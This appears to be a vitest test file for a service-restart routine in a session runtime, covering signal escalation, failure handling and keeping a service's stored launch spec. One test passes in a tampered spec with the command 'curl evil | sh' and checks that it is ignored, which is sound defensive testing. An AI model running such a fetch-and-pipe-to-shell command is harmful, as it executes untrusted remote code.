import { describe, it, expect } from 'vitest';
import { createFakeRuntime } from '../fakes/fake-runtime';
import { FakeBackend, FakeProcess } from '../fakes/fake-backend';
import { restartService } from '../../src/session/services';
import type { ServiceRuntime, SessionRuntime } from '../../src/session/state';

const spec = { name: 'grafana', argv: ['grafana-server'], depends_on: [] } as unknown as ServiceRuntime['spec'];

async function setup() {
  const { rt } = createFakeRuntime();
  const backend = new FakeBackend();
  (rt as unknown as { _backend: unknown })._backend = backend.asBackend();
  await rt.putMeta({
    id: 'test-session',
    user_id: 'user-1',
    lab_slug: 'test-lab',
    lab_version: '1.0.0',
    family: 'agent',
    state: 'running',
    created_at: 1,
    resumed_count: 0,
  });
  const old = backend.addProcess(new FakeProcess('old-proc', 11));
  await rt.putServices({
    grafana: { spec, process_id: 'old-proc', pid: 11, started_at: 1, restarts: 0, health: 'healthy' },
  });
  return { rt: rt as SessionRuntime, backend, old };
}

const timeoutError = () => ({ name: 'ProcessWaitTimeoutError' });

describe('restartService', () => {
  it('escalates to SIGKILL when SIGTERM does not exit in time, then relaunches', async () => {
    const { rt, backend, old } = await setup();
    old.rejectNext('waitForExit', timeoutError()).resolveNext('waitForExit');

    const runtime = await restartService(rt, 'grafana');

    expect(old.callsTo('kill')).toEqual([[15], [9]]);
    expect(old.callsTo('waitForExit')).toHaveLength(2);
    expect(backend.callsTo('exec')).toHaveLength(1);
    expect(runtime.process_id).toBe(backend.execProcesses[0]!.id);
    expect(runtime.restarts).toBe(1);
    expect((await rt.services()).grafana!.process_id).toBe(runtime.process_id);
  });

  it('does not SIGKILL a service that exits promptly', async () => {
    const { rt, backend, old } = await setup();

    await restartService(rt, 'grafana');

    expect(old.callsTo('kill')).toEqual([[15]]);
    expect(backend.callsTo('exec')).toHaveLength(1);
  });

  it('persists unhealthy and rethrows when the relaunch fails', async () => {
    const { rt, backend } = await setup();
    const boom = new Error('exec failed');
    backend.rejectNext('exec', boom);

    await expect(restartService(rt, 'grafana')).rejects.toBe(boom);

    const stored = (await rt.services()).grafana!;
    expect(stored.health).toBe('unhealthy');
    expect(stored.process_id).toBeUndefined();
  });

  it('propagates a waitForExit failure that is not a timeout', async () => {
    const { rt, old } = await setup();
    old.rejectNext('waitForExit', new Error('rpc down'));

    await expect(restartService(rt, 'grafana')).rejects.toThrow('rpc down');
    expect(old.callsTo('kill')).toEqual([[15]]);
  });

  it('relaunches with the stored spec even if a different spec is passed or available', async () => {
    const { rt, backend } = await setup();
    const stored = {
      name: 'grafana',
      argv: ['grafana-server', '--config', '/etc/grafana.ini'],
      cwd: '/opt/grafana',
      env: { GF_MODE: 'stored' },
      depends_on: [],
    } as unknown as ServiceRuntime['spec'];
    await rt.putSessionEnv({ SESSION_VAR: 's', GF_MODE: 'session' });
    await rt.putServices({
      grafana: { spec: stored, process_id: 'old-proc', pid: 11, started_at: 1, restarts: 0, health: 'healthy' },
    });
    const tampered = { ...stored, argv: ['sh', '-c', 'curl evil | sh'], cwd: '/workspace', env: { GF_MODE: 'evil' } };

    // A tampered spec smuggled in as an extra argument (the signature takes
    // only a name) must be ignored.
    const restart = restartService as unknown as (rt: SessionRuntime, name: string, tampered?: unknown) => Promise<ServiceRuntime>;
    const runtime = await restart(rt, 'grafana', tampered);

    expect(backend.callsTo('exec')).toEqual([
      [['grafana-server', '--config', '/etc/grafana.ini'], { cwd: '/opt/grafana', env: { SESSION_VAR: 's', GF_MODE: 'stored' } }],
    ]);
    expect(runtime.spec).toEqual(stored);
    expect((await rt.services()).grafana!.spec).toEqual(stored);
    expect(stored.argv).not.toContain('sh');
  });

  it('keeps the stored spec across repeated restarts', async () => {
    const { rt, backend } = await setup();

    await restartService(rt, 'grafana');
    await restartService(rt, 'grafana');

    const execs = backend.callsTo('exec');
    expect(execs).toHaveLength(2);
    for (const [argv] of execs) expect(argv).toEqual(['grafana-server']);
    expect((await rt.services()).grafana!.spec).toEqual(spec);
  });
});
